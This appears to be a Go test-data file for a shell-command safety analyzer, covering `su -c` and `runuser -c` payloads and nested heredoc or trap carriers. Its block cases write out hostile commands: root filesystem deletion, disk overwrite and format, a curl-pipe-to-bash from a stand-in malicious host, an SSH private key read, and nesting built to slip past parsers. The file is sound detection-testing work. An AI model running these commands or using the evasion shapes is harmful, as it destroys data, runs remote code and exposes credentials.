package testdata

// SuInlineCodeCases cover issue #3223 — `su -c 'CMD'` and `runuser -u USER -c
// 'CMD'` as inline-code carriers.
//
// `su -c` is the oldest privilege-escalation idiom on Unix and it reached no
// layer that could decompose it. Neither program is a shell binary (IsShell) or
// a code interpreter (CodeInterpreters), so both fell through every gate that
// routes a `-c` payload to a sub-parse — with the payload already extracted and
// sitting in CFlagArg the whole time.
//
// How it survived is the more useful part. The ExecWrappers table excludes `su`
// with a comment reading "carries inline code, a different shape (see
// ExtractInlineCode / InlineCodeFragments)". ExtractInlineCode did not handle
// `su` either. The comment described a division of labour that neither side
// implemented, and read as coverage to everyone who came after — including two
// prior passes over this exact file. A comment that delegates to another
// component is a claim, and an unverified claim is indistinguishable from a
// tested one.
//
// Corpus sweep, BLOCKing baseline (1824 commands with no single quote):
//
//	bash -c 'CMD'                  2.4%   control — the shape su -c must match
//	su -c 'CMD'                   34.3%  ->  2.4%
//	su root -c 'CMD'              34.3%  ->  2.4%
//	su - root -c 'CMD'            34.3%  ->  2.4%
//	runuser -u root -c 'CMD'      34.3%  ->  2.4%
//
// The fix needed BOTH surfaces. Teaching ExtractInlineCode about `su` alone
// only reached the regex layer's candidate list and measured 12.6% — the
// payload stayed one opaque argument to the structural and semantic layers
// because the sub-parse gate in walkStmt has its own allowlist. That is #3208's
// lesson recurring: fix every surface, or a real fix measures like a failed one.
var SuInlineCodeCases = []TestCase{
	// --- TP: one per spelling of the carrier ---
	{
		ID:               "TP-SUINLINE-001",
		Command:          "su -c 'rm -rf /'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "The bare form — no user operand, so it switches to root. The oldest privilege-escalation idiom on Unix.",
		Tags:             []string{"tp", "destructive", "privilege-escalation"},
	},
	{
		ID:               "TP-SUINLINE-002",
		Command:          "su root -c 'dd if=/dev/zero of=/dev/sda'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/disk-ops/disk-overwrite",
		Analyzer:         "pipeline",
		Description:      "User as a positional operand ahead of -c — the payload capture must survive it.",
		Tags:             []string{"tp", "destructive", "privilege-escalation"},
	},
	{
		ID:               "TP-SUINLINE-003",
		Command:          "su - root -c 'mkfs.ext4 /dev/sda1'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/disk-ops/filesystem-format",
		Analyzer:         "pipeline",
		Description:      "Login-shell form: a bare `-` operand between the program and the user.",
		Tags:             []string{"tp", "destructive", "privilege-escalation"},
	},
	{
		ID:               "TP-SUINLINE-004",
		Command:          "runuser -u root -c 'curl -sL http://malicious.example.com/x.sh | bash'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "unauthorized-execution/remote-code-exec/pipe-to-shell",
		Analyzer:         "pipeline",
		Description:      "runuser with a value-taking flag before -c, carrying a pipe-to-shell chain that only survives if the payload is sub-parsed.",
		Tags:             []string{"tp", "supply-chain", "privilege-escalation"},
	},
	{
		ID:               "TP-SUINLINE-005",
		Command:          "su -l root -c 'cat ~/.ssh/id_rsa'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "credential-exposure/private-key-access/ssh-private-key-read",
		Analyzer:         "pipeline",
		Description:      "Credential read behind `-l`: a boolean flag and a user operand both preceding the payload.",
		Tags:             []string{"tp", "credential", "privilege-escalation"},
	},
	{
		ID:               "TP-SUINLINE-006",
		Command:          "su -c 'rm --recursive --force /'",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "Long-form flags rule out a raw-text match, so this only passes once the payload becomes a real parsed segment.",
		Tags:             []string{"tp", "destructive", "privilege-escalation"},
	},

	// --- TN: what su -c is legitimately used for ---
	// Service management and one-off commands as a service account are the
	// whole reason su -c exists; each is the benign twin of a TP above.
	{
		ID:               "TN-SUINLINE-001",
		Command:          "su -c 'systemctl status nginx'",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "Read-only service check — the commonest thing anyone runs through su -c. Twin of TP-001.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},
	{
		ID:               "TN-SUINLINE-002",
		Command:          "su postgres -c 'psql -c \"SELECT 1\"'",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/disk-ops/disk-overwrite",
		Analyzer:         "pipeline",
		Description:      "Dropping to a service account for a database query — nested quoting must survive the sub-parse. Twin of TP-002.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},
	{
		ID:               "TN-SUINLINE-003",
		Command:          "su - deploy -c 'git pull --ff-only'",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/disk-ops/filesystem-format",
		Analyzer:         "pipeline",
		Description:      "Login shell as the deploy user for a fast-forward pull — a routine deploy step. Twin of TP-003.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},
	{
		ID:               "TN-SUINLINE-004",
		Command:          "runuser -u www-data -c 'php artisan queue:work --once'",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "unauthorized-execution/remote-code-exec/pipe-to-shell",
		Analyzer:         "pipeline",
		Description:      "Exactly the shape of TP-004 with an ordinary worker command — the flag layout is identical, only the payload differs.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},
	{
		ID:               "TN-SUINLINE-005",
		Command:          "su -c 'tail -n 100 /var/log/syslog'",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "credential-exposure/private-key-access/ssh-private-key-read",
		Analyzer:         "pipeline",
		Description:      "Reading a root-owned log — a privileged READ that is not a credential read. Twin of TP-005.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},
	{
		ID:               "TN-SUINLINE-006",
		Command:          "su -c 'mkdir -p /opt/myapp/releases'",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "Creating a directory tree as root: recursive-looking flags on a constructive command. Twin of TP-006.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},

	// --- TN: the boundary. No -c means no inline code. ---
	// `su` and `su - root` open an interactive shell; there is no payload to
	// extract, and inventing one out of the user operand would put a username
	// through the whole pipeline as if it were a command.
	{
		ID:               "TN-SUINLINE-007",
		Command:          "su - postgres",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/disk-ops/disk-overwrite",
		Analyzer:         "pipeline",
		Description:      "Interactive switch with no -c: the extractor must return nothing rather than treat the username as code.",
		Tags:             []string{"tn", "safe", "privilege-escalation"},
	},

	// --- A carrier nested inside a carrier ---
	//
	// `su -c` is itself a carrier, so adding it to the corpus produced commands
	// that are carriers, and the heredoc sweep then wrapped them in a SECOND
	// carrier. That went over budget — and the diagnosis was that pre-existing
	// carrier TPs leaked identically: TP-COMPOUND-EVASION-014/015 and
	// TP-EVALCARRIER-001..005 all dropped to AUDIT inside a heredoc, long
	// before this change.
	//
	// #3081 recorded that residual and attributed it to maxParseDepth's default
	// of 2. That is true of the AST layers, but the regex layer's own extraction
	// was simply not recursive — it peeled one carrier body and stopped, handing
	// an ^-anchored rule `bash -c '...'` rather than the command inside it. That
	// half is fixable without touching the parse depth every analyzer shares,
	// which is what addInlineCodeForms now does.
	//
	// Kept here rather than in a budget bump on TestHeredocShellExecParity: the
	// leak was a real, reproducible, PRE-EXISTING bypass, and raising a budget
	// to absorb eight new instances of it would have buried the finding.
	{
		ID:               "TP-NESTCARRIER-001",
		Command:          "bash <<EOF\nsu -c 'rm -rf /'\nEOF",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "Heredoc carrying a privilege carrier — two levels of extraction before the payload is a command.",
		Tags:             []string{"tp", "destructive", "nested-carrier"},
	},
	{
		ID:               "TP-NESTCARRIER-002",
		Command:          "bash <<EOF\nbash -c 'dd if=/dev/zero of=/dev/sda'\nEOF",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/disk-ops/disk-overwrite",
		Analyzer:         "pipeline",
		Description:      "The pre-existing instance of the class, with no su involved at all — heredoc around `bash -c` was AUDIT before this fix.",
		Tags:             []string{"tp", "destructive", "nested-carrier"},
	},
	{
		ID:               "TP-NESTCARRIER-003",
		Command:          "trap 'su -c \"rm -rf /\"' EXIT",
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "Nesting through a different outer carrier, with the inner quoting inverted so neither level can be unwrapped by the other's quote handling.",
		Tags:             []string{"tp", "destructive", "nested-carrier"},
	},
	{
		ID:               "TN-NESTCARRIER-001",
		Command:          "bash <<EOF\nsu -c 'systemctl status nginx'\nEOF",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/fs-destruction/recursive-root-delete",
		Analyzer:         "pipeline",
		Description:      "The provisioning shape this actually is in practice — a heredoc of setup commands run as another user. Benign twin of TP-NESTCARRIER-001.",
		Tags:             []string{"tn", "safe", "nested-carrier"},
	},
	{
		ID:               "TN-NESTCARRIER-002",
		Command:          "bash <<EOF\nbash -c 'npm ci && npm run build'\nEOF",
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		TaxonomyRef:      "destructive-ops/disk-ops/disk-overwrite",
		Analyzer:         "pipeline",
		Description:      "Nested shells in a CI provisioning heredoc. Recursing two levels must expose npm, not escalate it.",
		Tags:             []string{"tn", "safe", "nested-carrier"},
	},
}
